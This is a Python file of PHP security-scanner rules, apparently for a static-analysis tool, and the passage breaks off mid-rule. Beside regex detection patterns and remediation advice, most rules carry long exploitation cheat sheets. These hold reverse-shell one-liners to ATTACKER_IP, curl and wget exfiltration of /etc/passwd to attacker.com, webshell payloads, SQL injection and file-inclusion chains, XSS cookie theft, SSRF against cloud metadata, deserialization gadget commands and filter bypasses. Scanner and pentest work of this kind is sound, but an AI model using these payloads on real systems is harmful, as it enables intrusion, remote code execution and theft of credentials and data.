"""
PHP security rules for static analysis.
"""

from typing import List, Optional
from rules import SecurityRule, Severity


# ============================================================================
# PHP SECURITY RULES DATABASE
# ============================================================================

PHP_SECURITY_RULES: List[SecurityRule] = [
    # -------------------------------------------------------------------------
    # COMMAND INJECTION / RCE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-CMD-001",
        name="Command Injection via system()",
        pattern=r"\b(system|passthru|shell_exec|popen|proc_open)\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.\s*|\.\s*\$)",
        severity=Severity.CRITICAL,
        category="Command Injection",
        cwe_id="CWE-78",
        description="System command execution with user-controlled input allows arbitrary command execution.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PHP COMMAND INJECTION - REMOTE CODE EXECUTION                               ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY ANALYSIS:
Functions like system(), passthru(), shell_exec() execute shell commands.
If user input reaches these functions, attackers can execute arbitrary commands.

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. IDENTIFY THE INJECTION POINT:
   - Look for $_GET, $_POST, $_REQUEST in the command
   - Find the parameter name

2. INJECT SHELL METACHARACTERS:

   COMMAND CHAINING:
   ; id                          # Execute after previous command
   | id                          # Pipe output
   && id                         # Execute if previous succeeds
   || id                         # Execute if previous fails
   `id`                          # Command substitution
   $(id)                         # Command substitution (bash)

PAYLOAD EXAMPLES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Basic command execution
?cmd=;id
?file=test.txt;cat /etc/passwd
?host=127.0.0.1;whoami

# Reverse shell
?cmd=;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
?cmd=;php -r '$s=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
?cmd=;nc ATTACKER_IP 4444 -e /bin/bash

# File operations
?cmd=;cat /etc/passwd
?cmd=;ls -la /var/www/
?cmd=;find / -name "*.conf" 2>/dev/null

# Data exfiltration
?cmd=;curl http://attacker.com/$(cat /etc/passwd | base64)
?cmd=;wget http://attacker.com/?d=$(whoami)

CURL TESTING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

curl "http://target.com/vulnerable.php?cmd=;id"
curl "http://target.com/ping.php?host=127.0.0.1;cat+/etc/passwd"
curl -X POST "http://target.com/exec.php" -d "command=test;whoami"

BYPASS TECHNIQUES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# If spaces are filtered:
?cmd=;cat${IFS}/etc/passwd
?cmd=;cat</etc/passwd
?cmd=;{cat,/etc/passwd}

# If certain characters are filtered:
?cmd=;c'a't /etc/passwd
?cmd=;c"a"t /etc/passwd
?cmd=;/???/??t /etc/passwd  (glob pattern for /bin/cat)

# URL encoding:
?cmd=%3Bid                  (; encoded)
?cmd=%7Cid                  (| encoded)""",
        remediation="Never pass user input to shell commands. Use escapeshellarg() and escapeshellcmd(). Prefer PHP built-in functions over shell commands."
    ),
    SecurityRule(
        id="PHP-CMD-002",
        name="Command Injection via exec()",
        pattern=r"\bexec\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.\s*|\.\s*\$)",
        severity=Severity.CRITICAL,
        category="Command Injection",
        cwe_id="CWE-78",
        description="exec() with user input allows arbitrary command execution.",
        exploitation="""
EXPLOITATION:
Same as PHP-CMD-001. exec() returns the last line of output.

ADDITIONAL NOTES:
- exec($cmd, $output, $return_var) - check if output array is used
- May need to add ;echo to see output

POC:
?param=test;id;echo """,
        remediation="Use escapeshellarg() for arguments, escapeshellcmd() for commands. Better: avoid shell commands entirely."
    ),
    SecurityRule(
        id="PHP-CMD-003",
        name="Command Injection via Backticks",
        pattern=r"`[^`]*\$_(GET|POST|REQUEST|COOKIE|SERVER)",
        severity=Severity.CRITICAL,
        category="Command Injection",
        cwe_id="CWE-78",
        description="Backtick operator with user input executes shell commands.",
        exploitation="""
EXPLOITATION:
PHP backticks are equivalent to shell_exec().

EXAMPLE VULNERABLE CODE:
$output = `ping $_GET['host']`;

PAYLOADS: Same as PHP-CMD-001""",
        remediation="Never use backtick operator with user input. Use proper escaping or avoid shell commands."
    ),
    SecurityRule(
        id="PHP-CMD-004",
        name="Code Injection via eval()",
        pattern=r"\beval\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_][a-zA-Z0-9_]*)",
        severity=Severity.CRITICAL,
        category="Code Injection",
        cwe_id="CWE-94",
        description="eval() with user input allows arbitrary PHP code execution.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PHP CODE INJECTION VIA eval()                                               ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXPLOITATION:
eval() executes a string as PHP code. Full control over server.

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Execute system commands
?code=system('id');
?code=passthru('cat /etc/passwd');

# Read files
?code=echo file_get_contents('/etc/passwd');
?code=var_dump(file('/etc/passwd'));

# Write webshell
?code=file_put_contents('shell.php','<?php system($_GET["c"]);?>');

# Reverse shell
?code=system('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');

# Bypass techniques
?code=sy.stem('id');                    # String concatenation
?code=${system('id')};                  # Variable functions
?code=call_user_func('system','id');    # Callback

CONTEXT-DEPENDENT:
If eval("return $input;"):
?input=1;system('id');//

If eval("\\$var = '$input';"):
?input=';system('id');//""",
        remediation="NEVER use eval() with user input. There is no safe way to do this. Refactor code to avoid eval()."
    ),
    SecurityRule(
        id="PHP-CMD-005",
        name="Code Injection via preg_replace /e",
        pattern=r"preg_replace\s*\(\s*['\"][^'\"]*\/e['\"]",
        severity=Severity.CRITICAL,
        category="Code Injection",
        cwe_id="CWE-94",
        description="preg_replace with /e modifier executes replacement as PHP code (deprecated in PHP 7+).",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PHP CODE INJECTION VIA preg_replace /e MODIFIER                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY:
The /e modifier (PREG_REPLACE_EVAL) executes the replacement as PHP code.
DEPRECATED in PHP 5.5, REMOVED in PHP 7.0 - but still found in legacy code!

EXAMPLE VULNERABLE CODE:
preg_replace('/(.*)/e', 'strtoupper("\\1")', $_GET['input']);

EXPLOITATION:
?input={${phpinfo()}}
?input={${system(id)}}
?input=${eval($_GET[c])}

PAYLOAD ENCODING:
Sometimes need to encode:
?input=%7B%24%7Bsystem(id)%7D%7D""",
        remediation="Use preg_replace_callback() instead. Never use /e modifier."
    ),
    SecurityRule(
        id="PHP-CMD-006",
        name="Code Injection via create_function()",
        pattern=r"create_function\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_])",
        severity=Severity.CRITICAL,
        category="Code Injection",
        cwe_id="CWE-94",
        description="create_function() with user input allows code injection (deprecated in PHP 7.2+).",
        exploitation="""
EXPLOITATION:
create_function() internally uses eval(). Inject code in arguments or body.

EXAMPLE:
create_function('$x', $_GET['code']);

PAYLOAD:
?code=}system('id');//

The code becomes: function($x) { }system('id');// }""",
        remediation="Use anonymous functions (closures) instead. create_function() is deprecated."
    ),

    # -------------------------------------------------------------------------
    # SQL INJECTION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-SQL-001",
        name="SQL Injection via String Concatenation",
        pattern=r"(mysql_query|mysqli_query|pg_query|sqlite_query|\->query|\->execute)\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\.\s*\$|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.)",
        severity=Severity.CRITICAL,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="SQL query with direct user input concatenation allows SQL injection.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PHP SQL INJECTION                                                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

PAYLOADS FOR STRING CONTEXT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Authentication bypass
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin'--
' OR 1=1 --

# UNION-based extraction
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--
' UNION SELECT 1,@@version,3--

# Error-based extraction (MySQL)
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--

# Time-based blind
' AND SLEEP(5)--
' AND BENCHMARK(10000000,SHA1('test'))--

# Boolean-based blind
' AND 1=1--  (true)
' AND 1=2--  (false)
' AND SUBSTRING(username,1,1)='a'--

PAYLOADS FOR NUMERIC CONTEXT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1 OR 1=1
1 UNION SELECT NULL,NULL,NULL--
1 AND 1=1

FILE OPERATIONS (MySQL):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Read files
' UNION SELECT LOAD_FILE('/etc/passwd')--

# Write webshell
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--

SECOND-ORDER SQLi:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Register username: admin'--
Later queries using stored username become injectable

SQLMAP AUTOMATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/page.php?id=1" --os-shell""",
        remediation="Use prepared statements with PDO or mysqli. Never concatenate user input into SQL."
    ),
    SecurityRule(
        id="PHP-SQL-002",
        name="SQL Injection in WHERE Clause",
        pattern=r"(WHERE|AND|OR)\s+[^=]*=\s*['\"]?\s*\.\s*\$",
        severity=Severity.HIGH,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="SQL WHERE clause with concatenated variable is vulnerable to injection.",
        exploitation="See PHP-SQL-001 for exploitation techniques.",
        remediation="Use parameterized queries."
    ),
    SecurityRule(
        id="PHP-SQL-003",
        name="Unsafe PDO Query",
        pattern=r"\->query\s*\(\s*['\"][^'\"]*\.\s*\$|\->query\s*\(\s*\$",
        severity=Severity.HIGH,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="PDO query() with string concatenation bypasses prepared statement protection.",
        exploitation="Same as PHP-SQL-001. PDO->query() does NOT use prepared statements.",
        remediation="Use PDO->prepare() and execute() with bound parameters."
    ),

    # -------------------------------------------------------------------------
    # FILE INCLUSION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-LFI-001",
        name="Local File Inclusion",
        pattern=r"\b(include|include_once|require|require_once)\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.\s*|\.\s*\$)",
        severity=Severity.CRITICAL,
        category="File Inclusion",
        cwe_id="CWE-98",
        description="File inclusion with user-controlled path allows Local/Remote File Inclusion.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LOCAL FILE INCLUSION (LFI) / REMOTE FILE INCLUSION (RFI)                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

LOCAL FILE INCLUSION (LFI):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Basic path traversal
?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc/passwd
?page=..%252f..%252f..%252fetc/passwd (double encoding)

# Null byte injection (PHP < 5.3.4)
?page=../../../etc/passwd%00
?page=../../../etc/passwd%00.php

# PHP wrappers for code execution
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://input  (POST body becomes PHP code)
?page=data://text/plain,<?php system('id'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Log poisoning
?page=/var/log/apache2/access.log
User-Agent: <?php system($_GET['c']); ?>

# Session file inclusion
?page=/var/lib/php/sessions/sess_[SESSION_ID]
(after injecting PHP code into session)

# /proc/self/environ
?page=/proc/self/environ
(inject PHP in User-Agent header)

REMOTE FILE INCLUSION (RFI):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Requires allow_url_include = On (rare in modern PHP)

?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt?
?page=http://attacker.com/shell.txt%00

PHP WRAPPER TECHNIQUES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Read source code
?page=php://filter/convert.base64-encode/resource=index.php

# Execute code via php://input
curl -X POST "http://target.com/page.php?page=php://input" \\
  -d "<?php system('id'); ?>"

# Execute code via data://
?page=data://text/plain,<?php system('id'); ?>

# Zip wrapper
?page=zip://uploads/evil.zip%23shell.php

# Phar wrapper (if file upload available)
?page=phar://uploads/evil.phar/shell.php

LOG FILES TO CHECK:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/access_log
/proc/self/fd/0-20
/var/mail/www-data""",
        remediation="Never include files based on user input. Use whitelist of allowed files. Disable allow_url_include."
    ),

    # -------------------------------------------------------------------------
    # FILE OPERATIONS
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-PATH-001",
        name="Path Traversal in File Operations",
        pattern=r"\b(file_get_contents|file_put_contents|fopen|readfile|file|unlink|copy|rename|move_uploaded_file)\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.\s*|\.\s*\$)",
        severity=Severity.HIGH,
        category="Path Traversal",
        cwe_id="CWE-22",
        description="File operation with user-controlled path allows reading/writing arbitrary files.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PATH TRAVERSAL IN FILE OPERATIONS                                           ║
╚══════════════════════════════════════════════════════════════════════════════╝

FILE READ:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=/etc/passwd

SENSITIVE FILES TO READ:
- /etc/passwd, /etc/shadow
- /var/www/html/config.php
- /var/www/html/.env
- /var/www/html/wp-config.php
- ~/.ssh/id_rsa
- /proc/self/environ

FILE WRITE (if file_put_contents):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Write webshell
?file=../../../var/www/html/shell.php&content=<?php system($_GET['c']); ?>

FILE DELETE (if unlink):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

?file=../../../var/www/html/.htaccess
?file=../../../var/www/html/important.php""",
        remediation="Use basename() for filenames. Validate paths are within expected directory. Use realpath() and check prefix."
    ),
    SecurityRule(
        id="PHP-UPLOAD-001",
        name="Unrestricted File Upload",
        pattern=r"move_uploaded_file\s*\(\s*\$_FILES",
        severity=Severity.HIGH,
        category="File Upload",
        cwe_id="CWE-434",
        description="File upload detected - check for proper validation of file type, extension, and content.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  ARBITRARY FILE UPLOAD                                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC WEBSHELL UPLOAD:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Simple PHP webshell
<?php system($_GET['c']); ?>
<?php eval($_POST['c']); ?>
<?php passthru($_REQUEST['c']); ?>

BYPASS EXTENSION FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

shell.php.jpg              # Double extension
shell.php%00.jpg           # Null byte (old PHP)
shell.pHp                  # Case variation
shell.php5                 # Alternative extension
shell.phtml                # Alternative extension
shell.php.                 # Trailing dot
shell.php::$DATA          # NTFS alternate data stream (Windows)
shell.php%20               # Trailing space

BYPASS CONTENT-TYPE FILTERS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Change Content-Type header to: image/jpeg, image/png, image/gif

BYPASS MAGIC BYTE CHECKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

GIF89a<?php system($_GET['c']); ?>    # GIF header
\\xFF\\xD8\\xFF<?php system($_GET['c']); ?>  # JPEG header

POLYGLOT FILES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Create valid image that's also valid PHP:
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
mv image.jpg image.php.jpg

.HTACCESS UPLOAD:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Upload .htaccess with:
AddType application/x-httpd-php .jpg

Then upload shell.jpg with PHP code""",
        remediation="Validate file type using finfo_file(). Check extension against whitelist. Store outside webroot. Generate random filename."
    ),

    # -------------------------------------------------------------------------
    # XSS
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-XSS-001",
        name="Cross-Site Scripting (Reflected)",
        pattern=r"\b(echo|print|print_r|printf|var_dump)\s*[^;]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER\s*\[\s*['\"]HTTP_)",
        severity=Severity.HIGH,
        category="Cross-Site Scripting",
        cwe_id="CWE-79",
        description="Direct output of user input without encoding allows XSS.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  CROSS-SITE SCRIPTING (XSS)                                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

BASIC PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

COOKIE THEFT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="new Image().src='http://attacker.com/?c='+document.cookie">

FILTER BYPASS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<ScRiPt>alert(1)</ScRiPt>                    # Case variation
<scr<script>ipt>alert(1)</script>            # Nested tags
<img src="x" onerror="alert(1)">             # Event handlers
\\x3cscript\\x3ealert(1)\\x3c/script\\x3e       # Hex encoding
<svg/onload=alert(1)>                        # No space needed

IN ATTRIBUTE CONTEXT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
' onclick='alert(1)

IN JAVASCRIPT CONTEXT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

';alert(1);//
</script><script>alert(1)</script>
\\';alert(1);//""",
        remediation="Use htmlspecialchars() with ENT_QUOTES. Use Content-Security-Policy headers."
    ),

    # -------------------------------------------------------------------------
    # DESERIALIZATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-DESER-001",
        name="Insecure Deserialization",
        pattern=r"\bunserialize\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_SERVER|base64_decode|\$[a-zA-Z_])",
        severity=Severity.CRITICAL,
        category="Insecure Deserialization",
        cwe_id="CWE-502",
        description="unserialize() with user input can lead to Remote Code Execution via magic methods.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PHP OBJECT INJECTION / INSECURE DESERIALIZATION                             ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY:
PHP unserialize() reconstructs objects from serialized data.
If a class has magic methods (__destruct, __wakeup, __toString),
attackers can trigger code execution.

MAGIC METHODS TO EXPLOIT:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

__destruct()   - Called when object is destroyed
__wakeup()     - Called when unserializing
__toString()   - Called when object is used as string
__call()       - Called when inaccessible method is called

FINDING GADGET CHAINS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Look for classes with magic methods
2. Check if those methods execute user-controlled data
3. Use PHPGGC for known framework gadgets

PHPGGC (PHP Generic Gadget Chains):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# List available gadgets
./phpggc -l

# Generate Laravel RCE payload
./phpggc Laravel/RCE1 system id

# Generate Symfony RCE payload
./phpggc Symfony/RCE4 exec 'id'

# Generate WordPress payload
./phpggc WordPress/RCE1 system whoami

COMMON FRAMEWORK GADGETS:
- Laravel: Multiple RCE chains
- Symfony: SwiftMailer, Monolog
- WordPress: Various plugins
- Drupal: Multiple chains
- Magento: Multiple chains

EXAMPLE PAYLOAD STRUCTURE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

O:4:"Evil":1:{s:3:"cmd";s:2:"id";}

If class Evil has __destruct() that calls system($this->cmd):
Deserialization triggers system('id')

PHAR DESERIALIZATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PHAR files contain serialized metadata that gets deserialized
when accessed via phar:// wrapper.

If file operations use user input:
file_exists($_GET['file'])  with  ?file=phar://uploads/evil.phar

Create malicious PHAR with PHPGGC.""",
        remediation="Never unserialize untrusted data. Use JSON instead. If needed, use allowed_classes parameter (PHP 7+)."
    ),

    # -------------------------------------------------------------------------
    # SSRF
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-SSRF-001",
        name="Server-Side Request Forgery",
        pattern=r"\b(file_get_contents|curl_exec|curl_init|fopen|fsockopen|stream_socket_client)\s*\(\s*[^)]*(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$[a-zA-Z_][a-zA-Z0-9_]*\s*\.\s*|\.\s*\$)",
        severity=Severity.HIGH,
        category="Server-Side Request Forgery",
        cwe_id="CWE-918",
        description="HTTP request with user-controlled URL allows SSRF attacks.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  SERVER-SIDE REQUEST FORGERY (SSRF)                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

CLOUD METADATA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# AWS
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
?url=http://metadata.google.internal/computeMetadata/v1/

# Azure
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01

INTERNAL SERVICES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

?url=http://localhost:6379/              # Redis
?url=http://127.0.0.1:9200/_cat/indices  # Elasticsearch
?url=http://localhost:11211/             # Memcached
?url=http://internal-api.local/admin

FILE PROTOCOL:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

?url=file:///etc/passwd
?url=file:///var/www/html/config.php

BYPASS TECHNIQUES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

?url=http://127.1/                    # Shortened localhost
?url=http://0.0.0.0/
?url=http://[::1]/                    # IPv6 localhost
?url=http://0x7f000001/               # Hex IP
?url=http://2130706433/               # Decimal IP
?url=http://localhost.attacker.com/   # DNS pointing to 127.0.0.1""",
        remediation="Validate URLs against whitelist. Block private IP ranges. Use parse_url() and verify hostname."
    ),

    # -------------------------------------------------------------------------
    # AUTHENTICATION / AUTHORIZATION
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-AUTH-001",
        name="Hardcoded Credentials",
        pattern=r"(password|passwd|pwd|secret|api_?key|db_pass|mysql_pass)\s*=\s*['\"][^'\"]{4,}['\"]",
        severity=Severity.HIGH,
        category="Information Disclosure",
        cwe_id="CWE-798",
        description="Hardcoded credentials found in PHP code.",
        exploitation="""
EXPLOITATION:
1. Extract the credentials
2. Identify the service (database, API, etc.)
3. Test connectivity

COMMON USES:
- Database connections
- API keys
- Admin passwords
- Encryption keys""",
        remediation="Use environment variables or secure configuration files outside webroot."
    ),
    SecurityRule(
        id="PHP-AUTH-002",
        name="Weak Password Comparison",
        pattern=r"(\$_POST|\$_GET|\$_REQUEST)\s*\[\s*['\"]password['\"]\s*\]\s*==\s*",
        severity=Severity.MEDIUM,
        category="Authentication",
        cwe_id="CWE-287",
        description="Loose comparison (==) for password check may be bypassed with type juggling.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PHP TYPE JUGGLING IN AUTHENTICATION                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

VULNERABILITY:
PHP == performs type coercion. This can bypass authentication.

EXAMPLES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

"0e123" == "0e456"  → TRUE (both interpreted as 0)
"0" == false        → TRUE
"" == 0             → TRUE
[] == false         → TRUE
NULL == false       → TRUE

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If password hash starts with 0e and only contains digits:
Password hashes like: 0e462097431906509019562988736854

Send password "0" or any "0e..." string - they all equal 0!

MAGIC HASHES (MD5):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Strings whose MD5 hash starts with 0e (all digits):
- "240610708" → 0e462097431906509019562988736854
- "QNKCDZO"   → 0e830400451993494058024219903391

If: $hash == md5($_POST['password'])
Send: password=240610708 (if stored hash is 0e...)""",
        remediation="Use === for strict comparison. Use password_verify() for password checking."
    ),
    SecurityRule(
        id="PHP-AUTH-003",
        name="Session Fixation Risk",
        pattern=r"session_start\s*\(\s*\)(?!.*session_regenerate_id)",
        severity=Severity.MEDIUM,
        category="Session Management",
        cwe_id="CWE-384",
        description="Session started without regenerating ID after authentication - possible session fixation.",
        exploitation="""
SESSION FIXATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Attacker gets a valid session ID from target site
2. Attacker sends link with that session ID to victim:
   http://target.com/login.php?PHPSESSID=attacker_known_id
3. Victim logs in using that session
4. Attacker now has authenticated session

TESTING:
1. Set PHPSESSID cookie manually before login
2. Login
3. Check if same session ID is used after login""",
        remediation="Call session_regenerate_id(true) after successful authentication."
    ),

    # -------------------------------------------------------------------------
    # INFORMATION DISCLOSURE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="PHP-INFO-001",
